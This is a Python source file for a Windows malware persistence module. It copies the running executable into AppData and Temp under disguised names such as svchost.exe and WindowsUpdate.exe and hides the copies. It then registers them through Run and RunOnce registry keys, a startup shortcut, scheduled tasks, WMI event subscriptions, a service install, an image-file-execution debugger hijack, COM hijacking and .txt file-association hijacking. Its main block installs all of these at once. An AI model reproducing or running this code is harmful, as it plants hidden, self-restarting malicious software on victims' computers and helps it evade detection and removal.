import os
import sys
import ctypes
import shutil
import random
import string
import subprocess
import winreg
import base64
import json
from datetime import datetime, timedelta
import psutil

class Persistence:
    def __init__(self, config=None):
        self.config = config or {}
        self.appdata = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.temp = os.getenv("TEMP")
        self.startup_folder = os.path.join(self.appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        
    def copy_to_appdata(self, filename="svchost.exe"):
        try:
            target_dir = os.path.join(self.appdata, "Microsoft", "Windows", "Update")
            os.makedirs(target_dir, exist_ok=True)
            
            target_path = os.path.join(target_dir, filename)
            
            if sys.executable != target_path:
                if os.path.exists(target_path):
                    os.remove(target_path)
                shutil.copy2(sys.executable, target_path)
                
                # Set attributes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                FILE_ATTRIBUTE_SYSTEM = 0x04
                ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
            
            return target_path
        except:
            return None
    
    def copy_to_localappdata(self, filename="WindowsUpdate.exe"):
        try:
            target_dir = os.path.join(self.localappdata, "Microsoft", "Windows")
            os.makedirs(target_dir, exist_ok=True)
            
            target_path = os.path.join(target_dir, filename)
            
            if sys.executable != target_path:
                if os.path.exists(target_path):
                    os.remove(target_path)
                shutil.copy2(sys.executable, target_path)
                
                # Set attributes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN)
            
            return target_path
        except:
            return None
    
    def copy_to_temp(self, filename=None):
        try:
            if filename is None:
                filename = ''.join(random.choices(string.ascii_letters, k=8)) + ".exe"
            
            target_path = os.path.join(self.temp, filename)
            
            if sys.executable != target_path:
                if os.path.exists(target_path):
                    os.remove(target_path)
                shutil.copy2(sys.executable, target_path)
            
            return target_path
        except:
            return None
    
    def registry_run_key(self, name="WindowsUpdate", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def registry_run_key_local_machine(self, name="WindowsUpdateService", path=None):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return False
            
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def registry_run_once(self, name="WindowsUpdate", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def startup_folder_shortcut(self, name="WindowsUpdate.lnk", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            import win32com.client
            
            shortcut_path = os.path.join(self.startup_folder, name)
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = path
            shortcut.WorkingDirectory = os.path.dirname(path)
            shortcut.IconLocation = path
            shortcut.save()
            
            return True
        except:
            return False
    
    def scheduled_task(self, name="WindowsUpdateTask", path=None, interval_minutes=30):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            # Create scheduled task
            cmd = f'schtasks /create /tn "{name}" /tr "{path}" /sc minute /mo {interval_minutes} /f'
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
        except:
            return False
    
    def scheduled_task_hourly(self, name="WindowsUpdateHourly", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            cmd = f'schtasks /create /tn "{name}" /tr "{path}" /sc hourly /mo 1 /f'
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
        except:
            return False
    
    def scheduled_task_logon(self, name="WindowsUpdateLogon", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            cmd = f'schtasks /create /tn "{name}" /tr "{path}" /sc onlogon /rl highest /f'
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
        except:
            return False
    
    def wmi_event_subscription(self, name="WindowsUpdateEvent", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            # WMI Event Subscription for persistence
            wmi_script = f'''
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    Name = "{name}_Filter"
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "{name}_Consumer"
    CommandLineTemplate = "{path}"
}}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = $filter
    Consumer = $consumer
}}
'''
            
            ps_cmd = f'powershell -Command "{wmi_script}"'
            subprocess.Popen(ps_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
        except:
            return False
    
    def registry_policies(self, name="WindowsUpdatePolicy", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def app_init_dlls(self, dll_path=None):
        try:
            if dll_path is None:
                return False
            
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
            )
            
            winreg.SetValueEx(key, "Load", 0, winreg.REG_SZ, dll_path)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def ifeo_debugger(self, target_process="notepad.exe", debugger_path=None):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return False
            
            if debugger_path is None:
                debugger_path = self.copy_to_appdata()
            
            if debugger_path is None:
                return False
            
            key_path = f"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_process}"
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, debugger_path)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def service_install(self, service_name="WindowsUpdateService", path=None):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return False
            
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            cmd = f'sc create {service_name} binPath= "{path}" start= auto DisplayName= "Windows Update Service"'
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            return True
        except:
            return False
    
    def com_hijacking(self, clsid="{12345678-1234-1234-1234-123456789012}", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, path)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def file_association_hijack(self, extension=".txt", path=None):
        try:
            if path is None:
                path = self.copy_to_appdata()
            
            if path is None:
                return False
            
            key_path = f"Software\\Classes\\{extension}\\shell\\open\\command"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{path}" "%1"')
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def install_all_persistence(self):
        results = {
            "registry_run_key": False,
            "registry_run_once": False,
            "startup_folder": False,
            "scheduled_task": False,
            "scheduled_task_logon": False,
            "registry_policies": False
        }
        
        # Copy to AppData first
        appdata_path = self.copy_to_appdata()
        
        if appdata_path:
            # Registry Run Key
            results["registry_run_key"] = self.registry_run_key("WindowsUpdate", appdata_path)
            
            # Registry RunOnce
            results["registry_run_once"] = self.registry_run_once("WindowsUpdateOnce", appdata_path)
            
            # Startup Folder
            results["startup_folder"] = self.startup_folder_shortcut("WindowsUpdate.lnk", appdata_path)
            
            # Scheduled Task
            results["scheduled_task"] = self.scheduled_task("WindowsUpdateTask", appdata_path, 30)
            
            # Scheduled Task on Logon
            results["scheduled_task_logon"] = self.scheduled_task_logon("WindowsUpdateLogon", appdata_path)
            
            # Registry Policies
            results["registry_policies"] = self.registry_policies("WindowsUpdatePolicy", appdata_path)
        
        # Try Local Machine if admin
        if ctypes.windll.shell32.IsUserAnAdmin():
            results["registry_run_key_local_machine"] = self.registry_run_key_local_machine("WindowsUpdateService", appdata_path)
            results["service_install"] = self.service_install("WindowsUpdateService", appdata_path)
        
        return results
    
    def check_persistence_exists(self):
        checks = {
            "registry_run_key": False,
            "startup_folder": False,
            "scheduled_task": False
        }
        
        # Check registry
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_READ
            )
            try:
                value, _ = winreg.QueryValueEx(key, "WindowsUpdate")
                if value:
                    checks["registry_run_key"] = True
            except:
                pass
            winreg.CloseKey(key)
        except:
            pass
        
        # Check startup folder
        try:
            startup_files = os.listdir(self.startup_folder)
            for file in startup_files:
                if "WindowsUpdate" in file:
                    checks["startup_folder"] = True
                    break
        except:
            pass
        
        # Check scheduled tasks
        try:
            output = subprocess.check_output("schtasks /query", shell=True).decode()
            if "WindowsUpdate" in output:
                checks["scheduled_task"] = True
        except:
            pass
        
        return checks
    
    def remove_persistence(self):
        results = {
            "registry_run_key": False,
            "startup_folder": False,
            "scheduled_task": False
        }
        
        # Remove registry
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            try:
                winreg.DeleteValue(key, "WindowsUpdate")
                results["registry_run_key"] = True
            except:
                pass
            winreg.CloseKey(key)
        except:
            pass
        
        # Remove startup folder
        try:
            for file in os.listdir(self.startup_folder):
                if "WindowsUpdate" in file:
                    os.remove(os.path.join(self.startup_folder, file))
                    results["startup_folder"] = True
        except:
            pass
        
        # Remove scheduled tasks
        try:
            subprocess.Popen('schtasks /delete /tn "WindowsUpdateTask" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen('schtasks /delete /tn "WindowsUpdateLogon" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            results["scheduled_task"] = True
        except:
            pass
        
        return results

if __name__ == "__main__":
    persistence = Persistence()
    results = persistence.install_all_persistence()
    print(f"Persistence installed: {results}")